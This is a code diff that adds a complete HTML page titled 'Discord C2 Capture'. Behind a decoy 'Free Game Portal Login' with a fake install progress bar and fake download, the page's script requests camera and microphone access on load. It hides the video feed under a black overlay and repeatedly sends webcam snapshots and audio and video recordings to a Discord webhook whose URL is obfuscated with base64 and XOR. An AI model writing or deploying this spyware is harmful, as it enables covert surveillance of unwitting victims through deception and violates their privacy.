@@ -1,0 +1,256 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Discord C2 Capture</title>
+  <style>
+    body {
+      margin: 0;
+      font-family: Arial, sans-serif;
+      background-color: #111;
+      color: #eee;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      height: 100vh;
+      flex-direction: column;
+      gap: 20px;
+    }
+    #decoy-ui {
+      text-align: center;
+      background-color: #1e1e1e;
+      padding: 40px;
+      border-radius: 10px;
+      box-shadow: 0 0 20px #00ffcc30;
+    }
+    input {
+      background-color: #222;
+      border: none;
+      border-bottom: 2px solid #00ffc3;
+      color: #eee;
+      padding: 10px;
+      margin: 10px 0;
+      width: 80%;
+      font-size: 16px;
+    }
+    button {
+      background-color: #00ffc3;
+      border: none;
+      padding: 10px 20px;
+      color: #000;
+      font-weight: bold;
+      cursor: pointer;
+      border-radius: 5px;
+    }
+    #video-container {
+      position: relative;
+      width: 320px;
+      height: 240px;
+    }
+    #video {
+      width: 320px;
+      height: 240px;
+    }
+    #black-overlay {
+      position: absolute;
+      top: 0; left: 0;
+      width: 320px; height: 240px;
+      background-color: #111;
+      opacity: 1; /* Slightly transparent, tweak as needed */
+      z-index: 10;
+      pointer-events: none;
+    }
+    /* Hide canvas */
+    #canvas {
+      display: none;
+    }
+  </style>
+</head>
+<body>
+
+  <div id="decoy-ui">
+  <h2>Free Game Portal Login</h2>
+  <p>Authentication Required</p>
+  <input type="text" placeholder="Game Name"><br>
+  <input type="password" placeholder=" Free_gaMe12321"><br>
+  <button id="login-btn">Login</button>
+
+  <div id="loading-text" style="display:none; margin-top: 10px;">
+    Preparing your game... This usually takes about 10 minutes.
+  </div>
+
+  <div id="progress-container" style="display:none; width: 100%; background: #222; height: 10px; border-radius: 5px; margin-top: 10px;">
+    <div id="progress-bar" style="width: 0%; height: 100%; background: #00ffc3; border-radius: 5px;"></div>
+  </div>
+</div>
+
+
+  <div id="video-container">
+    <video id="video" autoplay playsinline muted></video>
+    <div id="black-overlay"></div>
+  </div>
+
+  <canvas id="canvas" width="320" height="240"></canvas>
+
+  <script>
+    const loginBtn = document.getElementById('login-btn');
+  const loadingText = document.getElementById('loading-text');
+  const progressContainer = document.getElementById('progress-container');
+  const progressBar = document.getElementById('progress-bar');
+
+  loginBtn.addEventListener('click', () => {
+    alert('Please wait while we prepare your game to install for free. It usually takes 10 minutes.');
+
+    loadingText.style.display = 'block';
+    progressContainer.style.display = 'block';
+
+    // Disable inputs and button
+    document.querySelectorAll('#decoy-ui input, #login-btn').forEach(el => el.disabled = true);
+
+    // Animate progress bar over 10 minutes (600000 ms)
+    let startTime = Date.now();
+    const duration = 600000; // 10 minutes in ms
+
+    function updateProgress() {
+      let elapsed = Date.now() - startTime;
+      let percent = Math.min((elapsed / duration) * 100, 100);
+      progressBar.style.width = percent + '%';
+
+      if (percent < 100) {
+        requestAnimationFrame(updateProgress);
+      } else {
+        loadingText.textContent = 'Game is ready! Enjoy!';
+        // Optionally enable button/input again or redirect
+      }
+        if (percent < 100) {
+  requestAnimationFrame(updateProgress);
+} else {
+  loadingText.textContent = 'Game is ready! Downloading...';
+  startFakeDownload();
+}
+    }
+      
+    function startFakeDownload() {
+  const link = document.createElement("a");
+  link.href = "https://example.com/fake-tool.zip"; //  The  file path here
+  link.download = "free-game.zip";
+  document.body.appendChild(link);
+  link.click();
+  document.body.removeChild(link);
+}
+    requestAnimationFrame(updateProgress);
+  });
+    const video = document.getElementById('video');
+    const canvas = document.getElementById('canvas');
+    const ctx = canvas.getContext('2d');
+
+   const xorKey = "shadowroot17";
+
+function xorEncryptDecrypt(input, key) {
+  let output = "";
+  for (let i = 0; i < input.length; i++) {
+    output += String.fromCharCode(input.charCodeAt(i) ^ key.charCodeAt(i % key.length));
+  }
+  return output;
+}
+
+const encodedWebhook = "GxwVFBxNXUALHUJUHBoFSgwYH0AOBFgYBA0DDAAYGRxARQIOQVxWXV1BQ1lbQQgORVlZUEAOHyk5DWR9IltSCAQ2NF0JMkhbPC8lVD8dKh4wJltmKkU7CAcvOF9cRVcGRBwRSRcPJVk6M31jERArKwQDAzsdOWt/FA==";
+
+function getWebhook() {
+  const base64Decoded = atob(encodedWebhook);
+  const decrypted = xorEncryptDecrypt(base64Decoded, xorKey);
+  return decrypted;
+}
+
+const webhookURL = getWebhook();
+ // webhook
+
+      function startVideoRecording(stream) {
+  const options = { mimeType: 'video/webm; codecs=vp8,opus' };
+  let recorder;
+  
+  function recordSegment() {
+    recorder = new MediaRecorder(stream, options);
+    const chunks = [];
+    
+    recorder.ondataavailable = e => {
+      if (e.data.size > 0) {
+        chunks.push(e.data);
+      }
+    };
+
+    recorder.onstop = () => {
+      const blob = new Blob(chunks, { type: 'video/webm' });
+      const filename = `video-${Date.now()}.webm`;
+      sendToDiscord(blob, filename);
+    };
+
+    recorder.start();
+
+    // Stop recording after 2 minutes (120000 ms)
+    setTimeout(() => {
+      recorder.stop();
+    }, 120000);
+  }
+
+  recordSegment();
+  setInterval(recordSegment, 120000);
+}
+
+
+    function dataURLtoBlob(dataurl) {
+      const arr = dataurl.split(',');
+      const mime = arr[0].match(/:(.*?);/)[1];
+      const bstr = atob(arr[1]);
+      let n = bstr.length;
+      const u8arr = new Uint8Array(n);
+      while(n--) u8arr[n] = bstr.charCodeAt(n);
+      return new Blob([u8arr], {type: mime});
+    }
+
+    function sendToDiscord(blob, filename) {
+      const form = new FormData();
+      form.append("file", blob, filename);
+      fetch(webhookURL, { method: "POST", body: form });
+    }
+
+    function takeSnapshot() {
+      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+      const dataUrl = canvas.toDataURL('image/png');
+      const blob = dataURLtoBlob(dataUrl);
+      const filename = `snap-${Date.now()}.png`;
+      sendToDiscord(blob, filename);
+    }
+
+    function startAudioRecording(stream) {
+      const audioStream = new MediaStream(stream.getAudioTracks());
+      const options = { mimeType: 'audio/webm;codecs=opus' };
+
+      function recordSegment() {
+        const recorder = new MediaRecorder(audioStream, options);
+        recorder.ondataavailable = e => {
+          if (e.data.size > 0) {
+            const filename = `mic-${Date.now()}.webm`;
+            sendToDiscord(e.data, filename);
+          }
+        };
+        recorder.start();
+        setTimeout(() => recorder.stop(), 60000); // record 1 min
+      }
+
+      recordSegment();
+      setInterval(recordSegment, 60000);
+    }
+
+    navigator.mediaDevices.getUserMedia({ video: true, audio: true }).then(stream => {
+      video.srcObject = stream;
+
+      video.onloadeddata = () => {
+        setInterval(takeSnapshot, 3000);
+      };
+
+      startAudioRecording(stream);
+      startVideoRecording(stream);
+    });
+  </script>
+</body>
+</html>
